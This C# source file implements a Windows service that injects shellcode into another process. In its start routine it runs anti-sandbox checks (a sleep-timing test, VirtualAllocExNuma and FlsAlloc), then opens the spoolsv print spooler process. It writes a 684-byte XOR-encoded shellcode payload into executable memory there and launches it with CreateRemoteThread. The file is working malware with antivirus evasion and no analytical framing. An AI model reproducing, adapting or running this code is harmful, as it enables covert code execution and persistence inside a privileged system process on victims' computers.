﻿using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace WindowsService2
{
    public partial class Service1 : ServiceBase
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType,
            UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }
            Process[] process = Process.GetProcessesByName("spoolsv");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process[0].Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);


            byte[] buf = new byte[684] { 0x8c, 0x7f, 0xd2, 0xa0, 0x9a, 0x98, 0xfb, 0x51, 0x44, 0x6a, 0x31, 0x66, 0x10, 0x14, 0x38, 0x38, 0x06, 0x83, 0x21, 0x22, 0xfb, 0x65, 0x31, 0x15, 0x3c, 0x38, 0xbc, 0x03, 0x5c, 0x22, 0xfb, 0x65, 0x71, 0x09, 0x5b, 0xb9, 0x7f, 0xda, 0x36, 0x3a, 0x38, 0x38, 0xe6, 0x0e, 0x20, 0x38, 0x06, 0x91, 0xe8, 0x56, 0x11, 0x4b, 0x53, 0x68, 0x4a, 0x31, 0xf6, 0x98, 0x49, 0x2b, 0x71, 0xf6, 0xb3, 0xa9, 0x38, 0x38, 0xbc, 0x03, 0x64, 0x2b, 0x21, 0xbc, 0x13, 0x78, 0x22, 0x71, 0xe7, 0x37, 0xc5, 0x12, 0x68, 0x3c, 0x53, 0x4b, 0xef, 0x02, 0x37, 0x51, 0x44, 0xe1, 0xf0, 0xbf, 0x51, 0x44, 0x6a, 0x38, 0xb2, 0x91, 0x30, 0x0d, 0x38, 0x36, 0x81, 0x00, 0xe1, 0x30, 0x17, 0x01, 0x0d, 0x6b, 0xa0, 0xbc, 0x19, 0x5c, 0x89, 0x26, 0x7a, 0x60, 0x8d, 0x22, 0x8f, 0xfe, 0x10, 0xcf, 0x5e, 0xf8, 0x7f, 0x50, 0x92, 0x22, 0x41, 0xf7, 0xfd, 0x05, 0xab, 0xb9, 0x3a, 0x10, 0x45, 0xab, 0x48, 0xd7, 0x24, 0xb5, 0x26, 0x73, 0x7b, 0x75, 0x4c, 0x2f, 0x49, 0xe6, 0x24, 0x9c, 0x32, 0x34, 0xbc, 0x11, 0x60, 0x23, 0x71, 0xe7, 0x37, 0x05, 0xe1, 0x7c, 0x7f, 0x15, 0xcf, 0x2a, 0x6c, 0x7e, 0x50, 0x94, 0x2b, 0xfb, 0x33, 0xd9, 0x05, 0x32, 0x38, 0x36, 0x81, 0x05, 0x32, 0x2e, 0x6e, 0x0b, 0x05, 0x32, 0x31, 0x6e, 0x10, 0x1e, 0x22, 0xf3, 0xdb, 0x71, 0x05, 0x38, 0x8f, 0xd7, 0x09, 0x05, 0x33, 0x2a, 0x7f, 0xda, 0x56, 0x83, 0x3b, 0xc8, 0xae, 0xbb, 0x37, 0x38, 0x06, 0x8a, 0x17, 0x23, 0xce, 0x40, 0x38, 0x2a, 0x03, 0x1e, 0x52, 0x25, 0x44, 0x2b, 0x26, 0x7f, 0xd8, 0xa5, 0x23, 0xb7, 0xf5, 0x1d, 0x33, 0x4c, 0x77, 0xc8, 0x84, 0x17, 0x39, 0x38, 0xbe, 0xb0, 0x17, 0x30, 0x3d, 0x06, 0x91, 0x09, 0x5b, 0xb9, 0x64, 0x02, 0x0d, 0xd0, 0x4a, 0x61, 0x28, 0xe3, 0x6a, 0x70, 0x37, 0x51, 0xbb, 0xbf, 0x98, 0x38, 0x51, 0x44, 0x6a, 0x41, 0x0e, 0x63, 0x6a, 0x5b, 0x46, 0x0f, 0x7f, 0x70, 0x5f, 0x5e, 0x06, 0x64, 0x70, 0x6a, 0x2a, 0x7f, 0xd8, 0x85, 0x23, 0xb7, 0xf7, 0xea, 0x45, 0x6a, 0x70, 0x7a, 0x60, 0x8d, 0x39, 0x23, 0x5d, 0x52, 0x17, 0x23, 0xca, 0x60, 0xd8, 0xdb, 0xac, 0x70, 0x37, 0x51, 0x44, 0x95, 0xa5, 0xdf, 0xd0, 0x44, 0x6a, 0x70, 0x18, 0x00, 0x21, 0x23, 0x39, 0x06, 0x1d, 0x69, 0x25, 0x31, 0x76, 0x14, 0x0d, 0x1b, 0x07, 0x5a, 0x21, 0x26, 0x5c, 0x16, 0x58, 0x38, 0x15, 0x47, 0x32, 0x74, 0x60, 0x23, 0x10, 0x36, 0x63, 0x1e, 0x33, 0x22, 0x06, 0x47, 0x01, 0x06, 0x05, 0x23, 0x65, 0x00, 0x2f, 0x0c, 0x23, 0x6e, 0x02, 0x7d, 0x5c, 0x11, 0x67, 0x69, 0x31, 0x53, 0x26, 0x04, 0x36, 0x10, 0x05, 0x33, 0x65, 0x26, 0x01, 0x5c, 0x05, 0x7c, 0x3a, 0x06, 0x2b, 0x12, 0x02, 0x68, 0x17, 0x5e, 0x0a, 0x78, 0x32, 0x34, 0x12, 0x28, 0x7a, 0x21, 0x1e, 0x09, 0x12, 0x0e, 0x15, 0x76, 0x35, 0x03, 0x5f, 0x36, 0x71, 0x0e, 0x1d, 0x70, 0x37, 0x12, 0x2e, 0x41, 0x75, 0x38, 0x13, 0x52, 0x21, 0x1a, 0x3c, 0x7d, 0x04, 0x1c, 0x76, 0x67, 0x34, 0x2c, 0x15, 0x51, 0x27, 0x0f, 0x5e, 0x47, 0x7e, 0x3f, 0x2d, 0x1c, 0x0a, 0x51, 0x3e, 0x2e, 0x6a, 0x38, 0xbe, 0x90, 0x17, 0x30, 0x31, 0x6f, 0x1c, 0x75, 0xa3, 0x23, 0x7f, 0xe9, 0x44, 0x58, 0xd8, 0xb3, 0x51, 0x44, 0x6a, 0x70, 0x67, 0x02, 0x17, 0x23, 0xb7, 0xf5, 0xba, 0x11, 0x44, 0x4b, 0xc8, 0x84, 0x0c, 0xe3, 0xb6, 0x5d, 0x5b, 0x1b, 0x22, 0xf9, 0xc6, 0x3b, 0x5b, 0x30, 0x22, 0x5f, 0xd1, 0x77, 0x6a, 0x70, 0x7e, 0xd8, 0xa4, 0x00, 0x74, 0x76, 0x08, 0x0d, 0xd0, 0x05, 0x71, 0xcf, 0xc2, 0x6a, 0x70, 0x37, 0x51, 0xbb, 0xbf, 0x3d, 0x06, 0x91, 0x17, 0x30, 0x38, 0xbe, 0xa0, 0x09, 0x5b, 0xb9, 0x7a, 0x60, 0x8d, 0x39, 0x23, 0x7e, 0x96, 0x86, 0x47, 0x76, 0x2f, 0x2a, 0xbb, 0xbf, 0xf5, 0xf7, 0x24, 0x5b, 0x22, 0xb7, 0xf6, 0xd9, 0x57, 0x6a, 0x70, 0x7e, 0xeb, 0x00, 0x9a, 0x45, 0xd7, 0x51, 0x44, 0x6a, 0x70, 0xc8, 0x84, 0x0c, 0x95, 0xbf, 0x43, 0x53, 0xaf, 0xc0, 0x98, 0x62, 0x51, 0x44, 0x6a, 0x23, 0x6e, 0x3b, 0x04, 0x30, 0x39, 0xbe, 0x80, 0x85, 0x88, 0x60, 0x7e, 0x96, 0x84, 0x6a, 0x60, 0x37, 0x51, 0x0d, 0xd0, 0x28, 0x93, 0x02, 0xa1, 0x6a, 0x70, 0x37, 0x51, 0xbb, 0xbf, 0x38, 0xa4, 0x02, 0x17, 0x22, 0xf9, 0xd0, 0x19, 0xcd, 0x9b, 0x38, 0xbe, 0x8b, 0x0d, 0xad, 0xb0, 0x37, 0x71, 0x44, 0x6a, 0x39, 0xbe, 0xa8, 0x0d, 0xd0, 0x62, 0xa1, 0xd8, 0xa6, 0x6a, 0x70, 0x37, 0x51, 0xbb, 0xbf, 0x38, 0xb4, 0x95, 0x64, 0xef, 0xb0, 0x43, 0xe3, 0x22, 0xe1, 0x77, 0x7f, 0x50, 0x87, 0xef, 0xb0, 0x42, 0x83, 0x1c, 0xa9, 0x28, 0x5d, 0x51, 0x1d, 0xd1, 0x90, 0x2a, 0x7b, 0x4e, 0x2b, 0xf9, 0xed, 0xae, 0x91 };

            byte[] xorKey = new byte[5] { 0x70, 0x37, 0x51, 0x44, 0x6a };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ xorKey[i % xorKey.Length]);
            }

            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
            //}

            //BlowMe bm = new BlowMe();
            //buf = bm.Decode(buf, 629);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        protected override void OnStop()
        {
            
        }
    }
}
